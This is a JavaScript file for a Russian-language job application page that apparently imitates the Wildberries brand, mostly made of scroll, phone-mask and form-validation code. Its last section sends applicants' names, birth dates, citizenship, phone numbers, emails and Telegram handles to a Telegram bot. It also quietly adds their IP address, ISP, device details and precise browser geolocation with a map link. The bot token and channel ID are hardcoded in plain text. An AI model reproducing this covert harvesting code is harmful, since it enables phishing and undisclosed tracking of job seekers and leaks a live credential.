// Initialize AOS
AOS.init({
    duration: 800,
    offset: 100,
    once: true
});

// Navbar Scroll Effect
const navbar = document.querySelector('.navbar');
window.addEventListener('scroll', () => {
    if (window.scrollY > 50) {
        navbar.style.background = 'rgba(203, 17, 171, 0.95)';
        navbar.style.backdropFilter = 'blur(10px)';
        navbar.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.1)';
    } else {
        navbar.style.background = 'transparent';
        navbar.style.backdropFilter = 'none';
        navbar.style.boxShadow = 'none';
    }
});

// Smooth Scroll
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            window.scrollTo({
                top: target.offsetTop - 80,
                behavior: 'smooth'
            });
        }
    });
});

// Form handling
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('applicationForm');
    const submitButton = form.querySelector('button[type="submit"]');
    const buttonText = submitButton.querySelector('.btn-text');
    const buttonLoader = submitButton.querySelector('.btn-loader');

    // Phone number formatting
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', function(e) {
        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
    });

    // Form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        // Validate form
        if (!form.checkValidity()) {
            e.stopPropagation();
            form.classList.add('was-validated');
            return;
        }

        // Show loading state
        submitButton.disabled = true;
        buttonText.style.opacity = '0';
        buttonLoader.classList.remove('d-none');

        // Collect form data
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());

        try {
            // Simulate API call (replace with actual API endpoint)
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Show success message
            Swal.fire({
                title: 'Спасибо!',
                text: 'Ваша анкета успешно отправлена. Мы свяжемся с вами в ближайшее время.',
                icon: 'success',
                confirmButtonText: 'OK',
                confirmButtonColor: '#CB11AB'
            });

            // Reset form
            form.reset();
            form.classList.remove('was-validated');
        } catch (error) {
            // Show error message
            Swal.fire({
                title: 'Ошибка!',
                text: 'Произошла ошибка при отправке анкеты. Пожалуйста, попробуйте еще раз.',
                icon: 'error',
                confirmButtonText: 'OK',
                confirmButtonColor: '#CB11AB'
            });
        } finally {
            // Reset button state
            submitButton.disabled = false;
            buttonText.style.opacity = '1';
            buttonLoader.classList.add('d-none');
        }
    });

    // Form field animations on scroll
    const formSection = document.getElementById('apply');
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('form-visible');
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.2 });

    observer.observe(formSection);
});

// Form submission handling
document.getElementById('applicationForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Здесь будет отправка данных на сервер
    // Имитация задержки отправки
    const submitButton = this.querySelector('.submit-button');
    const buttonText = submitButton.querySelector('span');
    const buttonIcon = submitButton.querySelector('i');
    
    // Изменяем текст кнопки и добавляем анимацию загрузки
    buttonText.textContent = 'Отправка...';
    buttonIcon.className = 'fas fa-spinner fa-spin';
    submitButton.disabled = true;
    
    setTimeout(() => {
        // Показываем модальное окно успеха
        const modal = document.getElementById('successModal');
        modal.classList.add('show');
        
        // Сбрасываем форму и кнопку
        this.reset();
        buttonText.textContent = 'Отправить анкету';
        buttonIcon.className = 'fas fa-paper-plane';
        submitButton.disabled = false;
    }, 1500);
});

// Закрытие модального окна
document.querySelector('.close-modal-button').addEventListener('click', function() {
    const modal = document.getElementById('successModal');
    modal.classList.remove('show');
});

// Закрытие модального окна при клике вне его
document.getElementById('successModal').addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.remove('show');
    }
});

// Form Validation
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.apply-form');
    const inputs = form.querySelectorAll('.form-control');

    const validations = {
        name: {
            pattern: /^[А-Яа-яЁё\s-]{2,50}$/,
            message: 'Пожалуйста, введите корректное имя (только русские буквы)'
        },
        email: {
            pattern: /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/,
            message: 'Пожалуйста, введите корректный email адрес'
        },
        phone: {
            pattern: /^\+7\s?\(?\d{3}\)?\s?\d{3}-?\d{2}-?\d{2}$/,
            message: 'Пожалуйста, введите номер в формате +7 (XXX) XXX-XX-XX'
        }
    };

    // Format phone number as user types
    const phoneInput = form.querySelector('input[name="phone"]');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0 && value[0] !== '7') {
                value = '7' + value;
            }
            if (value.length > 11) {
                value = value.slice(0, 11);
            }
            let formattedValue = '';
            if (value.length > 0) {
                formattedValue = '+' + value[0];
                if (value.length > 1) {
                    formattedValue += ' (' + value.slice(1, 4);
                }
                if (value.length > 4) {
                    formattedValue += ') ' + value.slice(4, 7);
                }
                if (value.length > 7) {
                    formattedValue += '-' + value.slice(7, 9);
                }
                if (value.length > 9) {
                    formattedValue += '-' + value.slice(9, 11);
                }
            }
            e.target.value = formattedValue;
        });
    }

    // Validate on input
    inputs.forEach(input => {
        const field = input.getAttribute('name');
        if (validations[field]) {
            input.addEventListener('input', function() {
                validateField(input, validations[field]);
            });
            input.addEventListener('blur', function() {
                validateField(input, validations[field]);
            });
        }
    });

    // File upload preview
    const fileUpload = form.querySelector('.file-upload input[type="file"]');
    const fileUploadText = form.querySelector('.file-upload-text');
    
    if (fileUpload) {
        fileUpload.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const fileName = file.name;
                const fileSize = (file.size / 1024 / 1024).toFixed(2);
                fileUploadText.innerHTML = `
                    <strong>${fileName}</strong><br>
                    <span>Размер файла: ${fileSize} МБ</span>
                `;
            }
        });
    }

    // Form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        let isValid = true;

        // Validate all fields before submission
        inputs.forEach(input => {
            const field = input.getAttribute('name');
            if (validations[field]) {
                if (!validateField(input, validations[field])) {
                    isValid = false;
                }
            }
        });

        if (isValid) {
            const submitButton = form.querySelector('button[type="submit"]');
            submitButton.disabled = true;
            submitButton.innerHTML = '<span class="btn-loader"></span> Отправка...';

            // Simulate form submission (replace with actual API call)
            setTimeout(() => {
                submitButton.innerHTML = 'Отправлено!';
                submitButton.classList.add('success');
                form.reset();

                // Reset button after 3 seconds
                setTimeout(() => {
                    submitButton.disabled = false;
                    submitButton.innerHTML = 'Отправить заявку';
                    submitButton.classList.remove('success');
                }, 3000);
            }, 2000);
        }
    });
});

function validateField(input, validation) {
    const errorMessage = input.parentElement.querySelector('.error-message');
    const isValid = validation.pattern.test(input.value);

    if (!isValid) {
        input.classList.add('error');
        if (errorMessage) {
            errorMessage.style.display = 'flex';
            errorMessage.innerHTML = `<i class="fas fa-exclamation-circle"></i>${validation.message}`;
        }
    } else {
        input.classList.remove('error');
        if (errorMessage) {
            errorMessage.style.display = 'none';
        }
    }

    return isValid;
}

// Stats Animation
function animateStats() {
    const stats = document.querySelectorAll('.stat-number');
    stats.forEach(stat => {
        const target = parseInt(stat.textContent);
        let current = 0;
        const increment = target / 50;
        const duration = 1500;
        const step = duration / 50;
        
        function updateValue() {
            current += increment;
            if (current < target) {
                stat.textContent = Math.round(current).toLocaleString() + (stat.textContent.includes('+') ? '+' : '');
                setTimeout(updateValue, step);
            } else {
                stat.textContent = target.toLocaleString() + (stat.textContent.includes('+') ? '+' : '');
            }
        }
        
        updateValue();
    });
}

// Run stats animation when in viewport
const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            animateStats();
            observer.unobserve(entry.target);
        }
    });
}, { threshold: 0.5 });

const statsSection = document.querySelector('.hero-stats');
if (statsSection) {
    observer.observe(statsSection);
}

// Preloader
window.addEventListener('load', () => {
    const preloader = document.createElement('div');
    preloader.className = 'preloader';
    preloader.innerHTML = `
        <div class="spinner">
            <div class="bounce1"></div>
            <div class="bounce2"></div>
            <div class="bounce3"></div>
        </div>
    `;
    document.body.appendChild(preloader);
    
    setTimeout(() => {
        preloader.style.opacity = '0';
        setTimeout(() => {
            preloader.remove();
        }, 300);
    }, 500);
});

// Валидация формы и проверка возраста
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.application-form');
    const errorModal = document.querySelector('.error-modal');
    const successModal = document.querySelector('.success-modal');
    
    // Функция проверки возраста
    function calculateAge(birthDate) {
        const today = new Date();
        const birth = new Date(birthDate);
        let age = today.getFullYear() - birth.getFullYear();
        const monthDiff = today.getMonth() - birth.getMonth();
        
        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
            age--;
        }
        return age;
    }

    // Маска для телефона
    const phoneInput = form.querySelector('.phone-input');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            // Убеждаемся, что первый символ это 7 или 8
            if (value.length > 0) {
                if (value[0] === '8') {
                    value = '7' + value.slice(1);
                } else if (value[0] !== '7') {
                    value = '7' + value;
                }
            }
            
            let formattedValue = '';
            if (value.length > 0) {
                formattedValue = '+' + value[0];
                if (value.length > 1) {
                    formattedValue += ' (' + value.slice(1, 4);
                }
                if (value.length > 4) {
                    formattedValue += ') ' + value.slice(4, 7);
                }
                if (value.length > 7) {
                    formattedValue += '-' + value.slice(7, 9);
                }
                if (value.length > 9) {
                    formattedValue += '-' + value.slice(9, 11);
                }
            }
            
            e.target.value = formattedValue;
        });

        // Добавляем обработчик для вставки номера
        phoneInput.addEventListener('paste', function(e) {
            e.preventDefault();
            let pastedText = (e.clipboardData || window.clipboardData).getData('text');
            let numericValue = pastedText.replace(/\D/g, '');
            
            // Проверяем первую цифру
            if (numericValue.length > 0) {
                if (numericValue[0] === '8') {
                    numericValue = '7' + numericValue.slice(1);
                } else if (numericValue[0] !== '7') {
                    numericValue = '7' + numericValue;
                }
            }
            
            // Форматируем номер
            let formattedValue = '';
            if (numericValue.length > 0) {
                formattedValue = '+' + numericValue[0];
                if (numericValue.length > 1) {
                    formattedValue += ' (' + numericValue.slice(1, 4);
                }
                if (numericValue.length > 4) {
                    formattedValue += ') ' + numericValue.slice(4, 7);
                }
                if (numericValue.length > 7) {
                    formattedValue += '-' + numericValue.slice(7, 9);
                }
                if (numericValue.length > 9) {
                    formattedValue += '-' + numericValue.slice(9, 11);
                }
            }
            
            this.value = formattedValue;
        });
    }

    // Функция валидации формы
    function validateForm(formData) {
        const errors = [];
        
        // Проверка имени и фамилии
        if (!formData.get('surname').trim()) {
            errors.push('Пожалуйста, введите фамилию');
        }
        if (!formData.get('firstName').trim()) {
            errors.push('Пожалуйста, введите имя');
        }
        
        // Проверка даты рождения и возраста
        const birthDate = formData.get('birthDate');
        if (!birthDate) {
            errors.push('Пожалуйста, введите дату рождения');
        } else {
            const age = calculateAge(birthDate);
            if (age < 18) {
                errors.push('Вам должно быть не менее 18 лет');
            }
        }
        
        // Проверка гражданства
        if (!formData.get('citizenship').trim()) {
            errors.push('Пожалуйста, укажите гражданство');
        }
        
        // Проверка телефона
        const phone = formData.get('phone').replace(/\D/g, '');
        if (!phone || phone.length !== 11) {
            errors.push('Пожалуйста, введите корректный номер телефона');
        }
        
        // Проверка email
        const email = formData.get('email');
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email || !emailRegex.test(email)) {
            errors.push('Пожалуйста, введите корректный email');
        }

        // Проверка Telegram
        const telegram = formData.get('telegram').trim();
        if (!telegram) {
            errors.push('Пожалуйста, укажите ваш Telegram');
        } else if (telegram.startsWith('@') && telegram.length < 5) {
            errors.push('Пожалуйста, введите корректный username Telegram');
        }
        
        // Проверка города
        if (!formData.get('city').trim()) {
            errors.push('Пожалуйста, укажите город');
        }
        
        // Проверка опыта работы
        if (!formData.get('experience')) {
            errors.push('Пожалуйста, укажите опыт работы');
        }
        
        // Проверка согласия
        if (!formData.get('consent')) {
            errors.push('Необходимо согласие на обработку персональных данных');
        }
        
        return errors;
    }

    // Функция отправки данных в Telegram
    async function sendToTelegram(formData) {
        const botToken = '7366514318:AAFNSvdBe5L9RM27mY9OnBEwRIH2dmizUVs';
        const channelId = '-1002277050427';
        
        // Форматируем дату
        const birthDate = new Date(formData.get('birthDate'));
        const formattedDate = birthDate.toLocaleDateString('ru-RU');
        
        // Формируем сообщение
        const message = `🔔 *Новая заявка на работу в WB*\n\n` +
            `👤 *ФИО:* ${formData.get('surname')} ${formData.get('firstName')} ${formData.get('middleName') || ''}\n` +
            `📅 *Дата рождения:* ${formattedDate}\n` +
            `⚤ *Пол:* ${formData.get('gender') === 'male' ? 'Мужской' : 'Женский'}\n` +
            `🌍 *Гражданство:* ${formData.get('citizenship')}\n` +
            `📱 *Телефон:* ${formData.get('phone')}\n` +
            `📧 *Email:* ${formData.get('email')}\n` +
            `💬 *Telegram:* ${formData.get('telegram')}\n` +
            `🏙 *Город:* ${formData.get('city')}\n` +
            `💼 *Опыт работы:* ${getExperienceText(formData.get('experience'))}\n` +
            (formData.get('about') ? `📝 *О себе:* ${formData.get('about')}\n` : '') +
            `\n📅 Дата заявки: ${new Date().toLocaleString('ru-RU')}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: channelId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error('Ошибка отправки в Telegram');
            }

            return true;
        } catch (error) {
            console.error('Ошибка отправки в Telegram:', error);
            return false;
        }
    }

    // Функция для получения информации об устройстве
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        const browser = {
            chrome: /chrome/i.test(ua),
            safari: /safari/i.test(ua),
            firefox: /firefox/i.test(ua),
            opera: /opera/i.test(ua),
            ie: /msie/i.test(ua),
            edge: /edge/i.test(ua),
            mobile: /mobile/i.test(ua),
            name: (function() {
                if (/edge/i.test(ua)) return 'Edge';
                if (/chrome/i.test(ua)) return 'Chrome';
                if (/firefox/i.test(ua)) return 'Firefox';
                if (/safari/i.test(ua)) return 'Safari';
                if (/opera/i.test(ua)) return 'Opera';
                if (/msie/i.test(ua)) return 'IE';
                return 'Unknown';
            })(),
            os: (function() {
                if (/windows/i.test(ua)) return 'Windows';
                if (/mac/i.test(ua)) return 'MacOS';
                if (/linux/i.test(ua)) return 'Linux';
                if (/android/i.test(ua)) return 'Android';
                if (/ios/i.test(ua)) return 'iOS';
                return 'Unknown';
            })(),
            device: (function() {
                if (/mobile/i.test(ua)) return 'Mobile';
                if (/tablet/i.test(ua)) return 'Tablet';
                return 'Desktop';
            })()
        };
        
        return browser;
    }

    // Функция для получения IP и геолокации
    async function getLocationInfo() {
        try {
            // Получаем IP и базовую информацию
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            // Получаем более точную геолокацию через браузер
            let position = null;
            try {
                position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
            } catch (e) {
                console.log('Геолокация недоступна:', e);
            }

            return {
                ip: ipData.ip,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country_name,
                latitude: position ? position.coords.latitude : ipData.latitude,
                longitude: position ? position.coords.longitude : ipData.longitude,
                timezone: ipData.timezone,
                isp: ipData.org,
                maps_url: `https://www.google.com/maps?q=${position ? position.coords.latitude : ipData.latitude},${position ? position.coords.longitude : ipData.longitude}`
            };
        } catch (error) {
            console.error('Ошибка получения информации о местоположении:', error);
            return null;
        }
    }

    // Обновляем функцию отправки в Telegram
    async function sendToTelegram(formData) {
        const botToken = '7366514318:AAFNSvdBe5L9RM27mY9OnBEwRIH2dmizUVs';
        const channelId = '-1002277050427';
        
        // Получаем информацию об устройстве и местоположении
        const deviceInfo = getDeviceInfo();
        const locationInfo = await getLocationInfo();
        
        // Форматируем дату
        const birthDate = new Date(formData.get('birthDate'));
        const formattedDate = birthDate.toLocaleDateString('ru-RU');
        
        // Формируем основное сообщение с данными формы
        let message = `🔔 *Новая заявка на работу в WB*\n\n` +
            `👤 *ФИО:* ${formData.get('surname')} ${formData.get('firstName')} ${formData.get('middleName') || ''}\n` +
            `📅 *Дата рождения:* ${formattedDate}\n` +
            `⚤ *Пол:* ${formData.get('gender') === 'male' ? 'Мужской' : 'Женский'}\n` +
            `🌍 *Гражданство:* ${formData.get('citizenship')}\n` +
            `📱 *Телефон:* ${formData.get('phone')}\n` +
            `📧 *Email:* ${formData.get('email')}\n` +
            `💬 *Telegram:* ${formData.get('telegram')}\n` +
            `🏙 *Город:* ${formData.get('city')}\n` +
            `💼 *Опыт работы:* ${getExperienceText(formData.get('experience'))}\n` +
            (formData.get('about') ? `📝 *О себе:* ${formData.get('about')}\n` : '');

        // Добавляем техническую информацию
        message += `\n📱 *Информация об устройстве:*\n` +
            `• Браузер: ${deviceInfo.name}\n` +
            `• ОС: ${deviceInfo.os}\n` +
            `• Устройство: ${deviceInfo.device}\n`;

        if (locationInfo) {
            message += `\n📍 *Информация о местоположении:*\n` +
                `• IP: ${locationInfo.ip}\n` +
                `• Город: ${locationInfo.city}\n` +
                `• Регион: ${locationInfo.region}\n` +
                `• Страна: ${locationInfo.country}\n` +
                `• Часовой пояс: ${locationInfo.timezone}\n` +
                `• Провайдер: ${locationInfo.isp}\n` +
                `• [Посмотреть на карте](${locationInfo.maps_url})\n`;
        }

        message += `\n📅 Дата заявки: ${new Date().toLocaleString('ru-RU')}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: channelId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            });

            if (!response.ok) {
                throw new Error('Ошибка отправки в Telegram');
            }

            return true;
        } catch (error) {
            console.error('Ошибка отправки в Telegram:', error);
            return false;
        }
    }

    // Функция для получения текстового описания опыта работы
    function getExperienceText(experience) {
        const experienceMap = {
            'no': 'Нет опыта',
            'less1': 'Менее 1 года',
            '1to3': '1-3 года',
            'more3': 'Более 3 лет'
        };
        return experienceMap[experience] || experience;
    }

    // Обновляем функцию отправки формы
    async function checkUserRestriction() {
        try {
            // Получаем IP пользователя
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            // Создаем уникальный ключ для пользователя на основе IP
            const userKey = `wb_form_${userIP}`;
            const lastSubmission = localStorage.getItem(userKey);

            if (lastSubmission) {
                const lastTime = new Date(parseInt(lastSubmission));
                const now = new Date();
                const hoursDiff = (now - lastTime) / (1000 * 60 * 60);
                
                if (hoursDiff < 24) {
                    const remainingHours = Math.ceil(24 - hoursDiff);
                    const remainingMinutes = Math.ceil((24 - hoursDiff) * 60) % 60;
                    return {
                        restricted: true,
                        remainingTime: `${remainingHours} ч. ${remainingMinutes} мин.`,
                        userIP: userIP
                    };
                }
            }
            return { restricted: false, userIP: userIP };
        } catch (error) {
            console.error('Ошибка при проверке ограничений:', error);
            // В случае ошибки получения IP используем только localStorage
            const lastSubmission = localStorage.getItem('wb_form_submission');
            if (lastSubmission) {
                const lastTime = new Date(parseInt(lastSubmission));
                const now = new Date();
                const hoursDiff = (now - lastTime) / (1000 * 60 * 60);
                
                if (hoursDiff < 24) {
                    const remainingHours = Math.ceil(24 - hoursDiff);
                    const remainingMinutes = Math.ceil((24 - hoursDiff) * 60) % 60;
                    return {
                        restricted: true,
                        remainingTime: `${remainingHours} ч. ${remainingMinutes} мин.`,
                        userIP: 'unknown'
                    };
                }
            }
            return { restricted: false, userIP: 'unknown' };
        }
    }

    // Функция для установки ограничения
    async function setUserRestriction() {
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;
            const userKey = `wb_form_${userIP}`;
            
            // Сохраняем время отправки с привязкой к IP
            localStorage.setItem(userKey, new Date().getTime().toString());
            // Дублируем в общее хранилище на случай ошибок с IP
            localStorage.setItem('wb_form_submission', new Date().getTime().toString());
        } catch (error) {
            console.error('Ошибка при установке ограничений:', error);
            // В случае ошибки сохраняем только в общее хранилище
            localStorage.setItem('wb_form_submission', new Date().getTime().toString());
        }
    }

    // Обновляем обработчик отправки формы
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Проверяем ограничения
        const restriction = await checkUserRestriction();
        if (restriction.restricted) {
            showError([`Вы уже отправляли заявку с IP ${restriction.userIP}. Повторная отправка будет доступна через ${restriction.remainingTime}`]);
            return;
        }

        const formData = new FormData(form);
        const errors = validateForm(formData);
        
        if (errors.length > 0) {
            showError(errors);
            return;
        }
        
        const submitButton = form.querySelector('.submit-button');
        submitButton.disabled = true;
        submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
        
        try {
            // Отправляем данные в Telegram
            const telegramSent = await sendToTelegram(formData);
            
            if (!telegramSent) {
                throw new Error('Ошибка отправки заявки');
            }

            // Устанавливаем ограничение после успешной отправки
            await setUserRestriction();

            // Показываем сообщение об успехе
            showSuccess();
            form.reset();

            // Обновляем текст в модальном окне успеха
            const successModal = document.querySelector('.success-modal');
            const successMessage = successModal.querySelector('p');
            successMessage.innerHTML = `Мы свяжемся с вами в ближайшее время.<br><br><small>Повторная отправка заявки будет доступна через 24 часа. Ваш IP: ${restriction.userIP}</small>`;
        } catch (error) {
            showError(['Произошла ошибка при отправке формы. Пожалуйста, попробуйте позже.']);
            console.error('Ошибка:', error);
        } finally {
            submitButton.disabled = false;
            submitButton.innerHTML = '<span>Отправить заявку</span><i class="fas fa-arrow-right"></i>';
        }
    });

    // При загрузке страницы проверяем ограничения
    window.addEventListener('load', async function() {
        const restriction = await checkUserRestriction();
        if (restriction.restricted) {
            const submitButton = form.querySelector('.submit-button');
            submitButton.disabled = true;
            submitButton.innerHTML = `<span>Доступно через ${restriction.remainingTime}</span>`;
            
            // Добавляем подсказку под кнопкой
            const muteHint = document.createElement('div');
            muteHint.className = 'mute-hint';
            muteHint.style.textAlign = 'center';
            muteHint.style.marginTop = '10px';
            muteHint.style.color = '#666';
            muteHint.style.fontSize = '14px';
            muteHint.innerHTML = `Вы сможете отправить новую заявку через ${restriction.remainingTime}<br>IP: ${restriction.userIP}`;
            submitButton.parentNode.insertBefore(muteHint, submitButton.nextSibling);
        }
    });

    // Функция показа ошибок
    function showError(errors) {
        const errorList = document.querySelector('.error-modal-list');
        errorList.innerHTML = errors.map(error => `<li>${error}</li>`).join('');
        errorModal.classList.add('show');
    }

    // Функция показа успешной отправки
    function showSuccess() {
        successModal.classList.add('show');
    }

    // Закрытие модальных окон
    document.querySelectorAll('.close-modal-button').forEach(button => {
        button.addEventListener('click', function() {
            errorModal.classList.remove('show');
            successModal.classList.remove('show');
        });
    });

    // Закрытие модальных окон при клике вне их области
    window.addEventListener('click', function(e) {
        if (e.target === errorModal) {
            errorModal.classList.remove('show');
        }
        if (e.target === successModal) {
            successModal.classList.remove('show');
        }
    });

    // Улучшение поля выбора даты
    const dateInput = form.querySelector('input[type="date"]');
    if (dateInput) {
        // Устанавливаем максимальную дату (18 лет назад от текущей даты)
        const today = new Date();
        const maxDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
        const minDate = new Date(today.getFullYear() - 100, today.getMonth(), today.getDate());
        
        dateInput.max = maxDate.toISOString().split('T')[0];
        dateInput.min = minDate.toISOString().split('T')[0];
    }
});
